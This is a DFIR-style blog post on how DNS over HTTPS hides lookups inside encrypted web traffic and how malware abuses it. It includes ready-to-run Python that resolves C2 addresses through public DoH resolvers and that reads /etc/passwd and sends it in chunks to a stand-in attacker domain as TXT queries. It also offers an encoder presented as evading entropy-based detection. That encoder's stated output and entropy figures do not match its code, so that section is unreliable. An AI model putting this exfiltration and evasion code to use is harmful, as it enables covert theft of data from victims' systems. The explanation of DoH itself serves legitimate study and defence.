---
title: <img width="50" height="50" src="/assets/images/dohh.png"> DOH: How DNS Hides Inside HTTPS
date: 2026-03-04 00:00:02 +730
categories: [Resources, DFIR]
comments: true
pin: true
mermaid: true
tags: [windows-forensics, digital-forensics, dns, dns over https, cyberattack, incident response , dfir, soc] # TAG names should always be lowercase
---
![](/assets/images/dohh.png)

# DoH: How DNS Hides Inside HTTPS — And Why Attackers Love It

**DNS over HTTPS (DoH)** encrypts DNS queries inside standard HTTPS. That's it. One sentence. But the forensic and security implications of that one sentence are enormous.

This post is purely technical — how it works, what the wire looks like, and how attackers exploit it.

----------

## 1. Classic DNS vs. DoH — The Core Difference

### Classic DNS (UDP/53)

A plaintext UDP packet. Anyone on the path can read it.

```
Client → DNS Resolver (UDP port 53)

Query:
  Transaction ID: 0x1a2b
  Question: evilc2.com  Type: A  Class: IN

Response:
  evilc2.com → 185.220.101.45

```

Wireshark sees it. Zeek logs it. Your firewall can block it. It's naked on the wire.

----------

### DoH (HTTPS/443)

The exact same DNS query, but wrapped inside a standard HTTPS POST or GET request — encrypted, indistinguishable from browser traffic.

```
Client → https://1.1.1.1/dns-query (TCP port 443, TLS 1.3)

POST /dns-query HTTP/2
Host: cloudflare-dns.com
Content-Type: application/dns-message
Accept: application/dns-message
Content-Length: 33

<binary DNS wire format payload — fully encrypted>

```

Your firewall sees: `TLS traffic to 1.1.1.1:443`. That's all it sees.

----------

## 2. The Two DoH Formats

DoH has two wire formats, and attackers choose between them deliberately.

### Format 1 — RFC 8484 (Binary, POST)

The DNS query is serialized in standard DNS wire format (binary), base64url-encoded, and sent as the request body.

```
POST /dns-query HTTP/2
Host: dns.google
Content-Type: application/dns-message
Accept: application/dns-message

# Body (hex): the raw DNS wire format
\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00
\x07evilc2\x03com\x00\x00\x01\x00\x01

```

Or as a GET with the DNS message base64url-encoded in the query string:

```
GET /dns-query?dns=AAABAAABAAAAAAAAB2V2aWxjMgNjb20AAAEAAQ== HTTP/2
Host: dns.google
Accept: application/dns-message

```

----------

### Format 2 — JSON API (Google/Cloudflare specific)

Human-readable. More commonly abused by malware because it's trivial to implement with any HTTP library.

```
GET /resolve?name=evilc2.com&type=A HTTP/2
Host: dns.google
Accept: application/json

```

Response:

```json
{
  "Status": 0,
  "TC": false,
  "RD": true,
  "RA": true,
  "AD": false,
  "CD": false,
  "Question": [{ "name": "evilc2.com.", "type": 1 }],
  "Answer": [
    {
      "name": "evilc2.com.",
      "type": 1,
      "TTL": 60,
      "data": "185.220.101.45"
    }
  ]
}

```

**PsiXBot** used exactly this format — a GET to `https://dns.google.com/resolve?name=<C2_domain>&type=A`, parsing the JSON blob to extract the C2 IP. Total implementation: ~15 lines of Python.

----------

## 3. What the TLS Handshake Actually Exposes

DoH uses standard TLS. The handshake leaks a small amount of metadata before encryption kicks in.

```
Client Hello (PLAINTEXT):
  TLS Version: 1.3
  SNI (Server Name Indication): dns.google         ← visible
  ALPN: h2                                          ← visible
  JA3 fingerprint: computed from cipher suites      ← visible

[TLS session established]

Application Data (ENCRYPTED):
  HTTP/2 request + DNS payload                      ← NOT visible

```

Two things are exposed:

-   **SNI**: the hostname the client is connecting to (`dns.google`, `cloudflare-dns.com`, `1.1.1.1` has no SNI)
-   **JA3**: a fingerprint of the TLS client hello — cipher suites, extensions, elliptic curves hashed to MD5

That's your only fingerprint on the wire. Everything else — the queried domain, the response, the TTL — is encrypted.

----------

## 4. Implementing DoH in 20 Lines (The Attacker's Toolkit)

This is how trivial it is. Any malware can drop this in.

```python
import httpx
import json

DOH_ENDPOINT = "https://dns.google/resolve"

def resolve_via_doh(domain: str) -> str:
    """Resolve a domain using Google's DoH JSON API."""
    resp = httpx.get(
        DOH_ENDPOINT,
        params={"name": domain, "type": "A"},
        headers={"Accept": "application/json"},
        http2=True,
    )
    data = resp.json()
    return data["Answer"][0]["data"]  # Returns IP string

# Usage: get C2 IP without touching corporate DNS resolver
c2_ip = resolve_via_doh("evilc2.com")

```

No custom socket code. No raw DNS parsing. Just an HTTPS GET with `httpx` or `requests`. The query never touches the corporate resolver — it goes straight to `8.8.8.8:443` or `1.1.1.1:443`, fully encrypted.

----------

## 5. Data Exfiltration via DoH — Custom Encoding

Beyond C2 resolution, DoH enables **covert data exfiltration** by encoding stolen data inside the DNS query itself. The domain name becomes the carrier.

### How DNS Labels Work

A DNS name is a sequence of labels separated by dots. Each label can be up to 63 characters. The full name can be up to 253 characters.

```
<label1>.<label2>.<label3>.attacker.com
  ↑
 up to 63 chars of arbitrary data here

```

### Attacker's Encoding Scheme

```python
import base64
import httpx

DOH_ENDPOINT = "https://dns.google/resolve"
C2_DOMAIN = "exfil.attacker.com"

def exfiltrate(data: bytes) -> None:
    """Encode data into DNS labels, ship via DoH."""
    # Base64url-encode the payload (DNS-safe alphabet)
    encoded = base64.urlsafe_b64encode(data).decode().rstrip("=")

    # Split into 63-char chunks (max DNS label size)
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]

    for i, chunk in enumerate(chunks):
        # <seq>.<chunk>.<c2domain>
        query_domain = f"{i}.{chunk}.{C2_DOMAIN}"
        httpx.get(DOH_ENDPOINT, params={"name": query_domain, "type": "TXT"})

# Example: exfiltrate /etc/passwd
with open("/etc/passwd", "rb") as f:
    exfiltrate(f.read())

```

What the attacker's authoritative DNS server receives on each query:

```
0.cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA.exfil.attacker.com
1.c3luYzp4OjQ6NjU1MzQ6c3luYzovYmluOi9iaW4vc2g.exfil.attacker.com
2.Z2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXMv.exfil.attacker.com

```

To any network monitor: these are TXT DNS lookups, wrapped in DoH, going to Google's `8.8.8.8:443`. The payload is invisible. No port anomaly. No protocol anomaly.

----------

### Custom Alphabets — Going Beyond Base64

Standard base64 has `+`, `/`, and `=` — not all DNS-safe. Attackers use custom encoding alphabets to evade entropy-based detectors that flag high-entropy subdomains.

```python
import string
import random

# Custom base32-like encoding using only lowercase + digits
# Looks like a real domain: "ac3bf2.xk9m1.exfil.attacker.com"
ALPHABET = string.ascii_lowercase + string.digits  # 36 chars

def encode_low_entropy(data: bytes) -> str:
    """Encode bytes into a DNS-safe string that looks like a normal subdomain."""
    result = []
    for byte in data:
        # Map each byte to two chars from alphabet (base-36 pair)
        result.append(ALPHABET[byte >> 4])
        result.append(ALPHABET[byte & 0x0F])
    return "".join(result)

# Output: "6f6574632f706173737764"
# Looks like a hash/ID — low suspicion, low Shannon entropy

```

A Shannon entropy check on `6f6574632f706173737764` returns ~3.2 bits/char — well within the range of normal domain labels. Standard base64 on the same data returns ~5.8 bits/char — clearly anomalous.

----------

## 6. Encoding the DNS Query Itself (RFC 8484 GET abuse)

The `dns=` query parameter in RFC 8484 GET mode is a base64url-encoded DNS wire message. Attackers can abuse this to stuff **arbitrary data** into the `dns=` parameter itself, using a legitimate DoH resolver as a carrier — without the resolver even processing the query correctly.

```python
import base64
import struct
import httpx

def craft_dns_wire(domain: str) -> bytes:
    """Manually craft a DNS wire format query."""
    txid = b'\xde\xad'       # Transaction ID
    flags = b'\x01\x00'      # Standard query, recursion desired
    counts = b'\x00\x01' + b'\x00\x00' * 3  # 1 question, 0 others

    # Encode the domain name
    labels = b""
    for part in domain.split("."):
        labels += bytes([len(part)]) + part.encode()
    labels += b'\x00'  # Root label

    qtype  = b'\x00\x10'  # TXT record
    qclass = b'\x00\x01'  # IN (Internet)

    return txid + flags + counts + labels + qtype + qclass

def send_doh_get(domain: str) -> dict:
    wire = craft_dns_wire(domain)
    encoded = base64.urlsafe_b64encode(wire).rstrip(b"=").decode()
    resp = httpx.get(
        "https://cloudflare-dns.com/dns-query",
        params={"dns": encoded},
        headers={"Accept": "application/dns-message"},
        http2=True,
    )
    return resp.content  # Raw DNS wire response

# Fire it
send_doh_get("secret.c2.attacker.com")

```

The HTTP/2 request on the wire:

```
GET /dns-query?dns=3q0BAAABAAAAAAAAB3NlY3JldAJjMgdhdHRhY2tlcgNjb20AABAAAg== HTTP/2
Host: cloudflare-dns.com
Accept: application/dns-message

```

To a network monitor: a perfectly ordinary DoH GET request to Cloudflare.

----------

## 7. The Complete Attack Chain

```
1. Malware drops on host
      ↓
2. Hardcodes: DOH_SERVER = "https://dns.google/resolve"
      ↓
3. GET /resolve?name=<RC4-encrypted-c2-domain>&type=A
   → HTTPS to 8.8.8.8:443
   → Corporate DNS resolver: never queried
   → Corporate DNS logs: empty
      ↓
4. C2 IP returned in JSON → malware connects to C2
      ↓
5. Exfiltration: stolen data → base64url chunks → DNS TXT labels
   → HTTPS POST to 1.1.1.1:443
   → Cloudflare receives TXT queries, forwards to attacker's nameserver
   → Attacker reconstructs data from label sequences
      ↓
6. Your SIEM: "Nothing unusual. HTTPS to Cloudflare. Move on."

```

----------

## Key Takeaways

-   DoH is RFC 8484 — DNS wire format or JSON, wrapped in HTTPS/2, port 443.
-   The **queried domain is fully encrypted**. You only see the DoH resolver's IP and SNI.
-   Any HTTP library can implement DoH in minutes — the barrier for malware authors is near zero.
-   DNS labels can carry ~180 bytes of encoded data per query. A 1MB file = ~5,500 DoH requests — invisible to most tools.
-   Custom encoding (base36, custom alphabets) defeats entropy-based detection by lowering Shannon entropy to normal-looking values.
-   The corporate DNS resolver is **completely bypassed** — no logs, no policy enforcement, no threat intel correlation.

----------

_References: RFC 8484 · Proofpoint PsiXBot Analysis · Qihoo 360 Godlua Backdoor Analysis · ScienceDirect DoH Exfiltration Detection (2022) · Salesforce JA3/JA3S Fingerprinting_


---

![](https://media.giphy.com/media/DAtJCG1t3im1G/giphy.gif)